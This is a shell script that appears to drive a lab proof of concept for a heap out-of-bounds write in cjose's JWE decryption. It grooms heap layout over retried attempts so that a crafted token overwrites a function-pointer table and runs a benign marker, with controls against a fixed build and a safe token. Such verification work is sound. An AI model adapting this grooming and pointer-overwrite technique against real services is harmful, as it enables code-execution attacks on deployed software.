#!/bin/sh
# WMARKER: wire-delivered function pointer + benign marker in a real loopback
# HTTP consumer. One ephemeral 127.0.0.1 listener per process, closed on exit.
# Controls: vulnerable marker executes; fixed cjose rejects before the write;
# safe token causes no marker. This is a labeled lab observation only: no
# ASLR defeat, no command execution, no r5 claim.
set -eu
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
cd "$HERE"
OUT="$HERE/evidence"
mkdir -p "$OUT"
[ -x ./wmarker-vulnerable ] || sh build.sh

for b in ./wmarker-vulnerable ./wmarker-fixed; do
    readelf -h "$b" | grep -q 'EXEC' || { echo "$b is not -no-pie" >&2; exit 1; }
done
nm ./wmarker-vulnerable | grep -q ' wmarker_fake_fntable' || {
    echo 'fake table symbol missing' >&2; exit 1;
}

# drive BIN MODE LOG [PARAMFILE]
#  attack: learn layout from server startup line, write PARAMFILE
#  fixed:  reuse PARAMFILE token parameters (same wire bytes)
#  safe:   unmodified 32-byte CEK token
drive() {
    bin=$1; mode=$2; log=$3; pfile=${4:-}
    : > "$log"
    "./$bin" > "$log" 2>&1 &
    pid=$!
    port=''; poll=0
    while [ "$poll" -lt 200 ]; do
        port=$(sed -n 's/^PORT=//p' "$log" | head -n 1)
        [ -n "$port" ] && break
        sleep 0.05
        poll=$((poll + 1))
    done
    if [ -z "$port" ]; then
        kill "$pid" 2>/dev/null || true
        wait "$pid" 2>/dev/null || true
        return 1
    fi
    if [ "$mode" = attack ]; then
        delta=$(sed -n 's/^HOLE=[^ ]* JWK=[^ ]* DELTA=\([^ ]*\) KEYDATA=\([^ ]*\).*/\1/p' "$log" | head -n 1)
        keydata=$(sed -n 's/^HOLE=[^ ]* JWK=[^ ]* DELTA=[^ ]* KEYDATA=\([^ ]*\).*/\1/p' "$log" | head -n 1)
        prev=$(sed -n 's/^JWK_PREV_SIZE=\([^ ]*\).*/\1/p' "$log" | head -n 1)
        size=$(sed -n 's/^JWK_PREV_SIZE=[^ ]* JWK_CHUNK_SIZE=\([^ ]*\).*/\1/p' "$log" | head -n 1)
        fns=$(sed -n 's/^JWK_PREV_SIZE=.*FAKE_FNS=\([^ ]*\).*/\1/p' "$log" | head -n 1)
        [ -n "$delta" ] && [ -n "$keydata" ] && [ -n "$prev" ] && [ -n "$size" ] && [ -n "$fns" ] || {
            kill "$pid" 2>/dev/null || true; wait "$pid" 2>/dev/null || true; return 1;
        }
        printf '%s %s %s %s %s\n' "$delta" "$keydata" "$prev" "$size" "$fns" > "$pfile"
        set -- $delta "$keydata" "$prev" "$size" "$fns"
        python3 client.py 127.0.0.1 "$port" attack "$@" >> "$log" 2>&1 || true
    elif [ "$mode" = fixed ]; then
        read -r delta keydata prev size fns < "$pfile"
        python3 client.py 127.0.0.1 "$port" fixed "$delta" "$keydata" "$prev" "$size" "$fns" >> "$log" 2>&1 || true
    else
        python3 client.py 127.0.0.1 "$port" safe 0 >> "$log" 2>&1 || true
    fi
    wait "$pid" 2>/dev/null || true
    return 0
}

# Fixed control needs the exact same wire token; client mode 'fixed' builds it
# from the saved parameters but is only ever sent to the fixed build.

# Bounded grooming retries: jansson's seeded hash table can shift allocation
# order; accept only the run where CEK reuses the hole and fns lands on fake.
saw=0
attempt=1
while [ "$attempt" -le 16 ]; do
    log="$OUT/attack-attempt-$attempt.log"
    if drive wmarker-vulnerable attack "$log" "$OUT/attack-params.txt"; then
        fns=$(sed -n 's/^JWK_PREV_SIZE=.*FAKE_FNS=\([^ ]*\).*/\1/p' "$log" | head -n 1)
        if grep -qF 'BENIGN_MARKER_EXECUTED' "$log" &&
           grep -qF 'MARKER_CALLED=1' "$log" &&
           grep -qF 'GROOM_OK=1' "$log" &&
           grep -q "JWK_FNS_NOW=$fns" "$log" &&
           grep -qF 'CEK_LEN_AFTER=' "$log"; then
            saw=1
            cp "$log" "$OUT/attack.log"
            break
        fi
    fi
    attempt=$((attempt + 1))
done
[ "$saw" -eq 1 ] || { echo 'WMARKER_NEGATIVE: no vulnerable marker run' >&2; exit 1; }

# Fixed build: identical wire token must be rejected before the OOB write.
drive wmarker-fixed fixed "$OUT/fixed.log" "$OUT/attack-params.txt"
grep -qF 'DECRYPT=0 ERRCODE=1' "$OUT/fixed.log"
grep -qF 'CEK_LEN_AFTER=32' "$OUT/fixed.log"
grep -qF 'MARKER_CALLED=0' "$OUT/fixed.log"

# Safe token: no chosen bytes past the CEK, no marker.
drive wmarker-vulnerable safe "$OUT/safe.log"
grep -qF 'MARKER_CALLED=0' "$OUT/safe.log"

printf '\n== attack ==\n'; cat "$OUT/attack.log"
printf '\n== fixed ==\n'; cat "$OUT/fixed.log"
printf '\n== safe ==\n'; cat "$OUT/safe.log"
echo WMARKER_OK
